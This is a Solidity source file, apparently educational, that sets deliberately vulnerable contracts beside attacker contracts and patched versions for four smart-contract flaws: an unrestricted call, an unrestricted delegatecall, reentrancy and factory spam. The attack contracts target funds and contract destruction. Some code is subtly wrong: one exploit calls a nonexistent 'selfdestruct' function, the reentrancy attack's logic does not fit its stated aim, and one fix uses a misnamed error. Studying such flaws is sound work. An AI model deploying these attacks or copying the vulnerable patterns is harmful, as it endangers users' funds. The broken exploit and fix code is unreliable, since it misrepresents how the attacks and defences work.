// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

/// @title SocketSuite.sol
/// @notice On‑chain analogues of four “Socket” patterns:
///   1) Public Socket Call  
///   2) Delegate Socket Module  
///   3) Streaming Socket (Reentrancy)  
///   4) Socket Factory (Resource DOS)  

////////////////////////////////////////////////////////////////////////
//                              ERRORS
////////////////////////////////////////////////////////////////////////
error Socket__NotOwner();
error Socket__ModuleNotAllowed();
error Socket__Reentrant();
error Factory__LimitExceeded();

/// Simple reentrancy guard
abstract contract NonReentrant {
    uint256 private _status;
    modifier nonReentrant() {
        if (_status == 1) revert Socket__Reentrant();
        _status = 1;
        _;
        _status = 0;
    }
}

////////////////////////////////////////////////////////////////////////
// 1) PUBLIC SOCKET CALL
//
//   • Type: raw low‑level call to arbitrary address  
//   • Attack: call malicious target to steal funds or self‑destruct  
//   • Defense: restrict to owner  
////////////////////////////////////////////////////////////////////////

contract PublicSocketVuln {
    event Called(address indexed target, bytes data);

    /// ❌ no access control
    function socketCall(address target, bytes calldata data) external {
        (bool ok, ) = target.call(data);
        require(ok, "call failed");
        emit Called(target, data);
    }
}

contract Attack_PublicSocket {
    PublicSocketVuln public sock;
    constructor(PublicSocketVuln _s) { sock = _s; }

    function exploit() external {
        // self‑destruct the socket contract
        bytes memory p = abi.encodeWithSignature("selfdestruct(address)", msg.sender);
        sock.socketCall(address(sock), p);
    }
}

contract PublicSocketSafe {
    address public owner;
    event Called(address indexed target, bytes data);

    constructor() { owner = msg.sender; }

    /// ✅ only owner may socketCall
    function socketCall(address target, bytes calldata data) external {
        if (msg.sender != owner) revert Socket__NotOwner();
        (bool ok, ) = target.call(data);
        require(ok, "call failed");
        emit Called(target, data);
    }
}

////////////////////////////////////////////////////////////////////////
// 2) DELEGATE SOCKET MODULE
//
//   • Type: delegatecall into external “module”  
//   • Attack: malicious module hijacks or self‑destructs hosting contract  
//   • Defense: whitelist modules & use CALL not DELEGATECALL  
////////////////////////////////////////////////////////////////////////

contract DelegateSocketVuln {
    address[] public modules;
    event ModuleAdded(address indexed mod);
    event Delegated(address indexed mod, bytes data);

    function addModule(address mod) external {
        modules.push(mod);
        emit ModuleAdded(mod);
    }

    /// ❌ unrestricted delegatecall
    function socketDelegate(bytes calldata data) external {
        for (uint i; i < modules.length; i++) {
            (bool ok, ) = modules[i].delegatecall(data);
            require(ok, "delegatecall failed");
            emit Delegated(modules[i], data);
        }
    }
}

contract Attack_DelegateSocket {
    DelegateSocketVuln public sock;
    constructor(DelegateSocketVuln _s) { sock = _s; }

    function exploit() external {
        // register self as module
        sock.addModule(address(this));
        // trigger delegatecall to fallback → self‑destruct sock
        sock.socketDelegate(abi.encodeWithSignature("fallback()"));
    }

    fallback() external {
        selfdestruct(payable(msg.sender));
    }
}

contract DelegateSocketSafe {
    address public owner;
    address[] public modules;
    mapping(address => bool) public allowed;
    event ModuleAdded(address indexed mod);
    event Delegated(address indexed mod, bytes data);

    constructor(address[] memory initial) {
        owner = msg.sender;
        for (uint i; i < initial.length; i++) {
            allowed[initial[i]] = true;
            modules.push(initial[i]);
        }
    }

    function approveModule(address mod) external {
        if (msg.sender != owner) revert Socket__NotOwner();
        allowed[mod] = true;
    }

    function addModule(address mod) external {
        if (msg.sender != owner) revert Socket__NotOwner();
        require(allowed[mod], "mod not allowed");
        modules.push(mod);
        emit ModuleAdded(mod);
    }

    /// ✅ uses CALL, only to approved modules
    function socketDelegate(bytes calldata data) external {
        for (uint i; i < modules.length; i++) {
            address m = modules[i];
            require(allowed[m], "mod not allowed");
            (bool ok, ) = m.call(data);
            require(ok, "call failed");
            emit Delegated(m, data);
        }
    }
}

////////////////////////////////////////////////////////////////////////
// 3) STREAMING SOCKET (Reentrancy)
//
//   • Type: streaming payments to multiple recipients  
//   • Attack: recipient re‑enters to receive more than fair share  
//   • Defense: nonReentrant guard  
////////////////////////////////////////////////////////////////////////

contract StreamingSocketVuln {
    address[] public recipients;

    function addRecipient(address r) external {
        recipients.push(r);
    }

    /// ❌ vulnerable to reentrancy
    function stream() external payable {
        uint len = recipients.length;
        uint share = msg.value / len;
        for (uint i; i < len; i++) {
            (bool ok, ) = recipients[i].call{value: share}("");
            require(ok, "stream failed");
        }
    }
}

contract Attack_StreamingSocket {
    StreamingSocketVuln public sock;
    constructor(StreamingSocketVuln _s) { sock = _s; }

    receive() external payable {
        // re‑enter while funds remain
        if (address(sock).balance > 0) {
            sock.stream{value: msg.value}();
        }
    }

    function exploit(address honest) external payable {
        sock.addRecipient(address(this));
        sock.addRecipient(honest);
        sock.stream{value: msg.value}();
    }
}

contract StreamingSocketSafe is NonReentrant {
    address[] public recipients;

    function addRecipient(address r) external {
        recipients.push(r);
    }

    /// ✅ nonReentrant to prevent re‑stream
    function stream() external payable nonReentrant {
        uint len = recipients.length;
        uint share = msg.value / len;
        for (uint i; i < len; i++) {
            (bool ok, ) = recipients[i].call{value: share}("");
            require(ok, "stream failed");
        }
    }
}

////////////////////////////////////////////////////////////////////////
// 4) SOCKET FACTORY (Resource DOS)
//
//   • Type: factory deploys new sockets  
//   • Attack: spam factory creating many sockets → block gas limits  
//   • Defense: owner‑only create + cap total  
////////////////////////////////////////////////////////////////////////

contract SocketFactoryVuln {
    address[] public sockets;

    /// ❌ anyone can deploy unlimited sockets
    function createSocket(bytes memory initCode) external returns (address sock) {
        assembly {
            sock := create(0, add(initCode, 0x20), mload(initCode))
        }
        require(sock != address(0), "create failed");
        sockets.push(sock);
    }
}

contract Attack_SocketFactory {
    SocketFactoryVuln public factory;
    bytes public initCode;
    constructor(SocketFactoryVuln _f, bytes memory _init) {
        factory = _f; initCode = _init;
    }
    function spam(uint count) external {
        for (uint i; i < count; i++) {
            factory.createSocket(initCode);
        }
    }
}

contract SocketFactorySafe {
    address public owner;
    address[] public sockets;
    uint256 public constant MAX_SOCKETS = 100;
    event SocketCreated(address sock);

    constructor() { owner = msg.sender; }

    function createSocket(bytes memory initCode) external returns (address sock) {
        if (msg.sender != owner) revert Factory__LimitExceeded();
        require(sockets.length < MAX_SOCKETS, "limit reached");
        assembly {
            sock := create(0, add(initCode, 0x20), mload(initCode))
        }
        require(sock != address(0), "create failed");
        sockets.push(sock);
        emit SocketCreated(sock);
    }
}
